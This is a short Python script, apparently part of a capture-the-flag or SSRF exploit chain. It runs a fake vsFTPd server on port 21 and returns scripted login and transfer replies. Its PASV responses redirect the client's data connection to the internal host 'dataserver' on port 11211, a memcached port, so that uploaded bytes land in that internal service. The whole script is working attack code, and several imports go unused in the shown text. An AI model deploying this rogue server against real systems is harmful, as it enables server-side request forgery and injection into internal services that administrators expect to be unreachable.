#!/usr/bin/env python3
import socketserver, threading, requests, subprocess, time, base64, secrets, sys, hashlib, os, socket, re

class MyTCPHandler(socketserver.StreamRequestHandler):
   def handle(self):
       dataserver_ip = socket.gethostbyname("dataserver");
       dataserver_ip = re.sub('[.]', ',', dataserver_ip)

       print('[+] connected', self.request, file=sys.stderr)
       self.request.sendall(b'220 (vsFTPd 3.0.3)\r\n')

       self.data = self.rfile.readline().strip().decode()
       print(self.data, file=sys.stderr,flush=True)
       self.request.sendall(b'230 Login successful.\r\n')

       self.data = self.rfile.readline().strip().decode()
       print(self.data, file=sys.stderr)
       self.request.sendall(b'227 Entering Passive Mode (' + dataserver_ip.encode('utf-8') + b',43,203)\r\n')

       self.data = self.rfile.readline().strip().decode()
       print(self.data, file=sys.stderr)
       self.request.sendall(b'227 Entering Passive Mode (' + dataserver_ip.encode('utf-8') + b',43,203)\r\n')

       self.data = self.rfile.readline().strip().decode()
       print(self.data, file=sys.stderr)
       self.request.sendall(b'200 Switching to Binary mode.\r\n')

       self.data = self.rfile.readline().strip().decode()
       print(self.data, file=sys.stderr)
       self.request.sendall(b'125 Data connection already open. Transfer starting.\r\n')

       self.data = self.rfile.readline().strip().decode()
       print(self.data, file=sys.stderr)
       self.request.sendall(b'250 Requested file action okay, completed.')
       exit()

def ftp_worker():
   with socketserver.TCPServer(('0.0.0.0', 21), MyTCPHandler) as server:
       while True:
           server.handle_request()
threading.Thread(target=ftp_worker).start()
time.sleep(2)
